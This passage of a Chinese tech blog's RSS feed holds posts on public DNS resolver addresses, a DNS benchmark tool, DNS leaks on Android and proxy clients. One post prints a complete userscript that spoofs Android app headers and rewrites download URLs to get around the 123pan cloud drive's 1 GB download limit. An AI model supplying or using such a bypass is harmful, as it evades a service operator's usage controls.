class="code"><pre><span class="line">123.125.81.6</span><br><span class="line">140.207.198.6</span><br></pre></td></tr></table></figure><p>DoH:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://doh.360.cn</span><br></pre></td></tr></table></figure><p>DoT:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dot.360.cn</span><br></pre></td></tr></table></figure><h2 id="CNNIC-DNS"><a href="#CNNIC-DNS" class="headerlink" title="CNNIC DNS"></a>CNNIC DNS</h2><p>IPV4:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.2.4.8</span><br><span class="line">210.2.4.8</span><br></pre></td></tr></table></figure><p>IPV6:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2001:dc7:1000::1</span><br></pre></td></tr></table></figure><h2 id="台湾Quad-101-twnic"><a href="#台湾Quad-101-twnic" class="headerlink" title="台湾Quad 101(twnic)"></a>台湾Quad 101(twnic)</h2><p>IPV4:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">101.101.101.101</span><br><span class="line">101.102.103.104</span><br></pre></td></tr></table></figure><p>IPV6:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2001:de4::101</span><br><span class="line">2001:de4::102</span><br></pre></td></tr></table></figure><p>DoH:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://dns.twnic.tw/dns-query</span><br></pre></td></tr></table></figure><h2 id="Google公共DNS"><a href="#Google公共DNS" class="headerlink" title="Google公共DNS"></a>Google公共DNS</h2><p>IPv4:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8.8.8.8</span><br><span class="line">8.8.4.4</span><br></pre></td></tr></table></figure><p>IPV6:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2001:4860:4860::8888</span><br><span class="line">2001:4860:4860::8844</span><br></pre></td></tr></table></figure><p>DoH:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://dns.google/dns-query</span><br><span class="line">https://8.8.8.8/dns-query</span><br><span class="line">https://8.8.4.4/dns-query</span><br></pre></td></tr></table></figure><p>DoT:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dns.google</span><br><span class="line">8.8.8.8</span><br><span class="line">8.8.4.4</span><br></pre></td></tr></table></figure><h2 id="Cloudflare公共DNS"><a href="#Cloudflare公共DNS" class="headerlink" title="Cloudflare公共DNS"></a>Cloudflare公共DNS</h2><p>IPV4:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.1.1.1</span><br><span class="line">1.0.0.1</span><br></pre></td></tr></table></figure><p>IPV6:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2606:4700:4700::1111</span><br><span class="line">2606:4700:4700::1001</span><br></pre></td></tr></table></figure><p>DoH:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://1.1.1.1/dns-query</span><br><span class="line">https://1.0.0.1/dns-query</span><br><span class="line">https://cloudflare-dns.com/dns-query</span><br></pre></td></tr></table></figure><p>DoT:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.1.1.1</span><br><span class="line">1.0.0.1</span><br><span class="line">1dot1dot1dot1.cloudflare-dns.com</span><br><span class="line">cloudflare-dns.com</span><br><span class="line">one.one.one.one</span><br></pre></td></tr></table></figure><h2 id="DNS-SB公共DNS"><a href="#DNS-SB公共DNS" class="headerlink" title="DNS.SB公共DNS"></a>DNS.SB公共DNS</h2><p>IPv4:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">185.222.222.222</span><br><span class="line">45.11.45.11</span><br></pre></td></tr></table></figure><p>IPV6:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2a09::</span><br><span class="line">2a11::</span><br></pre></td></tr></table></figure><p>DoH:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://doh.sb/dns-query</span><br><span class="line">https://doh.dns.sb/dns-query <span class="comment"># 和上一个相同, 只是域名不一样</span></span><br><span class="line">https://45.11.45.11/dns-query</span><br><span class="line">https://185.222.222.222/dns-query</span><br></pre></td></tr></table></figure><p>DoT:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dot.sb</span><br><span class="line">185.222.222.222</span><br><span class="line">45.11.45.11</span><br></pre></td></tr></table></figure><p>DoH香港节点:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://hk-hkg.doh.sb/dns-query </span><br><span class="line">https://dns.sb/doh/</span><br></pre></td></tr></table></figure><h2 id="AdGuard-公共DNS"><a href="#AdGuard-公共DNS" class="headerlink" title="AdGuard 公共DNS"></a>AdGuard 公共DNS</h2><p>IPV4默认过滤广告:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">94.140.14.14</span><br><span class="line">94.140.15.15</span><br></pre></td></tr></table></figure><p>IPV4无过滤:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">94.140.14.140</span><br><span class="line">94.140.14.141</span><br></pre></td></tr></table></figure><p>IPV4家庭保护(过滤广告与成人内容):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">94.140.14.15</span><br><span class="line">94.140.15.16</span><br></pre></td></tr></table></figure><p>DoH默认过滤广告:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://dns.adguard.com/dns-query</span><br></pre></td></tr></table></figure><p>DoH家庭保护(过滤广告与成人内容):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://dns-family.adguard.com/dns-query</span><br></pre></td></tr></table></figure><p>DoH非过滤:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://dns-unfiltered.adguard.com/dns-query</span><br></pre></td></tr></table></figure><p>DoT默认过滤广告:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns.adguard.com</span><br></pre></td></tr></table></figure><p>DoT家庭保护(过滤广告与成人内容):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns-family.adguard.com</span><br></pre></td></tr></table></figure><p>DoT非过滤:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns-unfiltered.adguard.com</span><br></pre></td></tr></table></figure><h2 id="OpenDNS-Cisco"><a href="#OpenDNS-Cisco" class="headerlink" title="OpenDNS(Cisco)"></a>OpenDNS(Cisco)</h2><p>IPv4:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">208.67.222.222</span><br><span class="line">208.67.220.220</span><br></pre></td></tr></table></figure><p>IPV4 Family:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">208.67.222.123</span><br><span class="line">208.67.220.123</span><br></pre></td></tr></table></figure><p>IPV6:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2620:0:ccc::2</span><br><span class="line">2620:0:ccd::2</span><br></pre></td></tr></table></figure><p>DoH:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://doh.opendns.com/dns-query</span><br></pre></td></tr></table></figure><p>DoH Family:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://doh.familyshield.opendns.com/dns-query</span><br></pre></td></tr></table></figure><p>DoT:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns.umbrella.com</span><br></pre></td></tr></table></figure><h2 id="IBM-Quad9"><a href="#IBM-Quad9" class="headerlink" title="IBM Quad9"></a>IBM Quad9</h2><p>IPv4默认安全:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">9.9.9.9</span><br><span class="line">149.112.112.112</span><br></pre></td></tr></table></figure><p>IPv6默认安全:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2620:fe::fe</span><br><span class="line">2620:fe::fe:9</span><br></pre></td></tr></table></figure><p>DoH默认:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://dns.quad9.net/dns-query</span><br></pre></td></tr></table></figure><p>DoT默认:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns.quad9.net</span><br></pre></td></tr></table></figure><p>IPv4无过滤:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">9.9.9.10</span><br><span class="line">149.112.112.10</span><br></pre></td></tr></table></figure><p>IPv6无过滤:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2620:fe::10</span><br><span class="line">2620:fe::fe:10</span><br></pre></td></tr></table></figure><p>DoH无过滤:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://dns10.quad9.net/dns-query</span><br></pre></td></tr></table></figure><p>DoT无过滤:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns10.quad9.net</span><br></pre></td></tr></table></figure><p>IPv4 ECS保护:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">9.9.9.11</span><br><span class="line">149.112.112.11</span><br></pre></td></tr></table></figure><p>IPv6 ECS保护:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2620:fe::11</span><br><span class="line">2620:fe::fe:11</span><br></pre></td></tr></table></figure><p>DoH ECS保护:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://dns11.quad9.net/dns-query</span><br></pre></td></tr></table></figure><p>DoT ECS保护:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns11.quad9.net</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E7%BD%91%E7%BB%9C/">网络</category>
      
      <category domain="https://zerospace.dev/tags/%E9%9A%90%E7%A7%81/">隐私</category>
      
      
      <comments>https://zerospace.dev/posts/5068ae4e/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>DNS测试工具-测一下全世界</title>
      <link>https://zerospace.dev/posts/56bd4a4/</link>
      <guid>https://zerospace.dev/posts/56bd4a4/</guid>
      <pubDate>Fri, 08 Nov 2024 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;dnspy-测试全世界的-DNS-服务器&quot;&gt;&lt;a href=&quot;#dnspy-测试全世界的-DNS-服务器&quot; class=&quot;headerlink&quot; title=&quot;dnspy - 测试全世界的 DNS 服务器&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://github.</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="dnspy-测试全世界的-DNS-服务器"><a href="#dnspy-测试全世界的-DNS-服务器" class="headerlink" title="dnspy - 测试全世界的 DNS 服务器"></a><a href="https://github.com/xxnuo/dns-benchmark">dnspy</a> - 测试全世界的 DNS 服务器</h2><p>数据分析面板预览</p><p><img src="https://ghp.ci/https://raw.githubusercontent.com/xxnuo/dns-benchmark/master/images/preview.png" alt="数据分析面板预览"></p><p><a href="https://bench.dash.2020818.xyz/">数据分析面板，内含示例数据</a></p><h2 id="测试工具"><a href="#测试工具" class="headerlink" title="测试工具"></a>测试工具</h2><p>在本仓库的 <a href="https://github.com/xxnuo/dns-benchmark/releases">releases</a> 页面中按你的系统架构下载 <code>dnspy-*</code> 文件，比如我的 PC 是 Intel 处理器的 macOS，所以下载 <code>dnspy-darwin-amd64</code> 文件</p><p>然后<strong>必须关闭所有代理软件的 Tun 模式、虚拟网卡模式，否则会影响测试结果</strong></p><p>重命名文件为 <code>dnspy</code>（Windows 是 <code>dnspy.exe</code>），然后打开终端，进入到你这个文件所在的目录。执行命令开始测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unset http_proxy https_proxy all_proxy HTTP_PROXY HTTPS_PROXY ALL_PROXY</span><br><span class="line">./dnspy</span><br></pre></td></tr></table></figure><p>按提示输入启动测试</p><p>默认使用多线程模式，以加快测试速度。但是默认参数 10 个线程需要至少上下行 1 MB&#x2F;s 网络和至少 4 核心处理器<br>如果网络或处理器不好，会导致测试结果不准确，必须通过<code>-w</code> 参数降低线程数。</p><p>测试完成后会输出到当前目录下形如 <code>dnspy_result_2024-11-07-17-32-13.json</code> 的 JSON 文件中</p><p>按程序提示输入 <code>Y</code> 或 <code>y</code> 或直接回车，会自动打开数据分析面板网站，点击网站右上角的 <code>读取分析</code> 按钮，选择你刚才的 JSON 文件，就可以看到可视化测试结果了</p>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E5%BC%80%E5%8F%91/">开发</category>
      
      <category domain="https://zerospace.dev/tags/%E7%BD%91%E7%BB%9C/">网络</category>
      
      <category domain="https://zerospace.dev/tags/%E8%BD%AF%E4%BB%B6/">软件</category>
      
      
      <comments>https://zerospace.dev/posts/56bd4a4/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>安卓私人DNS与代理中的DNS泄露问题探索</title>
      <link>https://zerospace.dev/posts/8493e3d2/</link>
      <guid>https://zerospace.dev/posts/8493e3d2/</guid>
      <pubDate>Thu, 07 Nov 2024 04:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;最近，我在研究安卓设备上私人DNS、代理软件与DNS泄露的问题，使用IPCheck.ing进行了多次测试，发现了一些有趣的现象。&lt;/p&gt;
&lt;h3 id=&quot;问题背景&quot;&gt;&lt;a href=&quot;#问题背景&quot; class=&quot;headerlink&quot; title=&quot;问题背景&quot;&gt;&lt;/a&gt;问题</description>
        
      
      
      
      <content:encoded><![CDATA[<p>最近，我在研究安卓设备上私人DNS、代理软件与DNS泄露的问题，使用IPCheck.ing进行了多次测试，发现了一些有趣的现象。</p><h3 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h3><p>在使用代理软件时，启用国内的DoT会导致DNS泄露，而不使用DoT则可能暴露真实IP。此外，境外的许多DoT服务被屏蔽，增加了日常使用的复杂性。</p><h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><ol><li><strong>国内DoT与代理软件</strong>：</li></ol><ul><li>当使用国内DoT时，代理软件可能导致DNS泄露，无法有效隐藏请求路径。</li></ul><ol start="2"><li><strong>不使用DoT的风险</strong>：</li></ol><ul><li>如果不使用DoT，DNS请求会通过运营商的DNS，存在被监控和暴露真实IP的风险。</li></ul><ol start="3"><li><strong>境外DoT的局限性</strong>：</li></ol><ul><li>由于许多境外DoT被屏蔽，无法使用，给网络体验带来困扰。</li></ul><h3 id="问题根源"><a href="#问题根源" class="headerlink" title="问题根源"></a>问题根源</h3><p>这些问题主要<strong>源于安卓系统的限制</strong>。在启用私人DNS后，代理软件无法修改DNS设置，即使是AdGuard等知名软件也面临类似挑战。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>经过多次尝试，我找到了一种平衡的方法：</p><p>把安卓私人DNS设置为dns.sb，这样可以有效避免DNS泄露。尽管在国内响应稍慢，但未被屏蔽，并能根据IP自动选择服务器。如果介意响应速度，日常使用时可以切换到国内的DoT；需要更高安全时，再切换到DNS.sb。</p><p>通过这些调整，我能够在不同场景下有效保护隐私，同时提升网络稳定性</p>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E7%BD%91%E7%BB%9C/">网络</category>
      
      <category domain="https://zerospace.dev/tags/%E9%9A%90%E7%A7%81/">隐私</category>
      
      
      <comments>https://zerospace.dev/posts/8493e3d2/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>纯国外提供的免费VPN和代理服务器</title>
      <link>https://zerospace.dev/posts/85bd3c84/</link>
      <guid>https://zerospace.dev/posts/85bd3c84/</guid>
      <pubDate>Wed, 06 Nov 2024 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;很多服务器节点，任意选择&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2024/11/06/rEq7IMmKLGRthVi.png&quot; alt=&quot;Open Proxy List&quot;&gt;&lt;/p&gt;
</description>
        
      
      
      
      <content:encoded><![CDATA[<p>很多服务器节点，任意选择</p><p><img src="https://s2.loli.net/2024/11/06/rEq7IMmKLGRthVi.png" alt="Open Proxy List"></p>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E9%9A%90%E7%A7%81/">隐私</category>
      
      
      <comments>https://zerospace.dev/posts/85bd3c84/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>绕过123pan的1G限制</title>
      <link>https://zerospace.dev/posts/808dd3aa/</link>
      <guid>https://zerospace.dev/posts/808dd3aa/</guid>
      <pubDate>Sun, 03 Nov 2024 03:23:48 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Q：这个脚本谁写的？&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;A：不是我写的，脚本里面有注释，但是已经删库了。&lt;/stron</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>Q：这个脚本谁写的？</strong><br><strong>A：不是我写的，脚本里面有注释，但是已经删库了。</strong></p><p><strong>Q：有没有什么优化？</strong><br><strong>A：没有，只删除了冗余的重复代码，改了一些函数调用。</strong></p><p><strong>Q：怎么使用？</strong><br><strong>A：物理机或者虚拟机上面下个123，自己抓包自己改脚本里面的???，不再提供现成UA。改完丢进油猴里面就行。</strong></p><p><img src="https://s2.loli.net/2024/11/03/TqoNeIgw1XLsx25.jpg" alt="抓Key"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">// ==UserScript==</span><br><span class="line">// @name         123云盘下载辅助</span><br><span class="line">// @namespace    https://github.com/Bao-qing/123pan</span><br><span class="line">// @version      0.3</span><br><span class="line">// @description  123 Cloud Drive Unlimited Flow</span><br><span class="line">// @match        https://www.123pan.com/*</span><br><span class="line">// @match        https://www.123pan.cn/*</span><br><span class="line">// @match        https://www.123865.com/*</span><br><span class="line">// @match        https://www.123684.com/*</span><br><span class="line">// @grant        none</span><br><span class="line">// @author       Qing</span><br><span class="line">// @downloadURL https://update.greasyfork.org/scripts/510621/123%E4%BA%91%E7%9B%98%E4%B8%8B%E8%BD%BD%E8%BE%85%E5%8A%A9.user.js</span><br><span class="line">// @updateURL https://update.greasyfork.org/scripts/510621/123%E4%BA%91%E7%9B%98%E4%B8%8B%E8%BD%BD%E8%BE%85%E5%8A%A9.meta.js</span><br><span class="line">// ==/UserScript==</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="title">function</span></span> () &#123;</span><br><span class="line">    const OriginalXHR = window.XMLHttpRequest;</span><br><span class="line">    const headersToOverride = &#123;</span><br><span class="line">        <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;123pan/v2.4.7(Android_??;???)&quot;</span>,</span><br><span class="line">        <span class="string">&quot;platform&quot;</span>: <span class="string">&quot;android&quot;</span>,</span><br><span class="line">        <span class="string">&quot;app-version&quot;</span>: <span class="string">&quot;69&quot;</span>,</span><br><span class="line">        <span class="string">&quot;x-app-version&quot;</span>: <span class="string">&quot;2.4.7&quot;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">NewXHR</span></span>() &#123;</span><br><span class="line">        const xhr = new OriginalXHR();</span><br><span class="line"></span><br><span class="line">        xhr.open = <span class="keyword">function</span> (method, url, async, user, password) &#123;</span><br><span class="line">            this._url = url;</span><br><span class="line">            <span class="built_in">return</span> OriginalXHR.prototype.open.call(this, method, url, async, user, password);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        xhr.setRequestHeader = <span class="keyword">function</span> (header, value) &#123;</span><br><span class="line">            const lowerHeader = header.toLowerCase();</span><br><span class="line">            <span class="keyword">if</span> (lowerHeader <span class="keyword">in</span> headersToOverride) &#123;</span><br><span class="line">                value = headersToOverride[lowerHeader];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                console.log(<span class="string">&#x27;未覆盖的请求头:&#x27;</span>, header);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">return</span> OriginalXHR.prototype.setRequestHeader.call(this, header, value);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        xhr.send = <span class="keyword">function</span> (...args) &#123;</span><br><span class="line">            this.addEventListener(<span class="string">&#x27;readystatechange&#x27;</span>, <span class="function"><span class="title">function</span></span> () &#123;</span><br><span class="line">                <span class="keyword">if</span> (xhr.readyState === 4 &amp;&amp; xhr.status === 200) &#123;</span><br><span class="line">                    try &#123;</span><br><span class="line">                        const responseJSON = JSON.parse(xhr.responseText);</span><br><span class="line">                        console.log(<span class="string">&#x27;原始响应:&#x27;</span>, responseJSON);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (responseJSON.data &amp;&amp; responseJSON.data.DownloadUrl) &#123;</span><br><span class="line">                            const originUrl = responseJSON.data.DownloadUrl;</span><br><span class="line">                            const newUrlNoRedirect = `<span class="variable">$&#123;originUrl&#125;</span>&amp;auto_redirect=0`;</span><br><span class="line">                            const base64Data = btoa(newUrlNoRedirect);</span><br><span class="line">                            responseJSON.data.DownloadUrl = `https://web-pro2.123952.com/download-v2/?params=<span class="variable">$&#123;base64Data&#125;</span>&amp;is_s3=0`;</span><br><span class="line">                            console.log(<span class="string">&#x27;修改后的 DownloadUrl:&#x27;</span>, responseJSON.data.DownloadUrl);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        const modifiedResponseText = JSON.stringify(responseJSON);</span><br><span class="line"></span><br><span class="line">                        Object.defineProperty(xhr, <span class="string">&#x27;responseText&#x27;</span>, &#123;</span><br><span class="line">                            get: () =&gt; modifiedResponseText</span><br><span class="line">                        &#125;);</span><br><span class="line">                        console.log(<span class="string">&#x27;修改后的响应:&#x27;</span>, modifiedResponseText);</span><br><span class="line">                    &#125; catch (error) &#123;</span><br><span class="line">                        console.error(<span class="string">&#x27;修改响应时出错:&#x27;</span>, error);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">return</span> OriginalXHR.prototype.send.apply(this, args);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> xhr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    window.XMLHttpRequest = NewXHR;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E7%BD%91%E7%BB%9C/">网络</category>
      
      <category domain="https://zerospace.dev/tags/%E8%BD%AF%E4%BB%B6/">软件</category>
      
      
      <comments>https://zerospace.dev/posts/808dd3aa/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Pandora-Box使用教程</title>
      <link>https://zerospace.dev/posts/2cb65d91/</link>
      <guid>https://zerospace.dev/posts/2cb65d91/</guid>
      <pubDate>Sat, 02 Nov 2024 12:53:28 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;1、Pandora-Box-是什么？&quot;&gt;&lt;a href=&quot;#1、Pandora-Box-是什么？&quot; class=&quot;headerlink&quot; title=&quot;1、Pandora-Box 是什么？&quot;&gt;&lt;/a&gt;1、&lt;a href=&quot;https://github.com/sn</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="1、Pandora-Box-是什么？"><a href="#1、Pandora-Box-是什么？" class="headerlink" title="1、Pandora-Box 是什么？"></a>1、<a href="https://github.com/snakem982/Pandora-Box">Pandora-Box</a> 是什么？</h1><ul><li>一个简易的 Mihomo 桌面客户端，可以进行网络代理</li><li>爬取功能可以管理大量订阅节点，支持对节点的协议类型和国家地区筛选，支持将爬取的节点导出</li><li>Windows 最新版本 <a href="https://github.com/snakem982/Pandora-Box/releases/download/v0.2.20/windows-amd64.zip">windows-amd64.zip </a></li><li>Mac intel 处理器最新版本 <a href="https://github.com/snakem982/Pandora-Box/releases/download/v0.2.20/darwin-amd64.zip">darwin-amd64.zip</a></li><li>Mac M 处理器最新版本 <a href="https://github.com/snakem982/Pandora-Box/releases/download/v0.2.20/darwin-arm64.zip">darwin-arm64.zip</a></li></ul><h1 id="2、本文重点介绍其爬取的使用，其他的自行探索"><a href="#2、本文重点介绍其爬取的使用，其他的自行探索" class="headerlink" title="2、本文重点介绍其爬取的使用，其他的自行探索"></a>2、本文重点介绍其爬取的使用，其他的自行探索</h1><p><em>Pandora-Box：下文简称pb</em></p><h3 id="2-1、爬取原理是什么？"><a href="#2-1、爬取原理是什么？" class="headerlink" title="2.1、爬取原理是什么？"></a>2.1、爬取原理是什么？</h3><p>没看源码，个人猜测<br>pb会根据你输入的url地址，发起网络请求<br>对请求的内容进行解析，然后收集整理出各个类型的节点<br>再进一步去重后使用 Mihomo 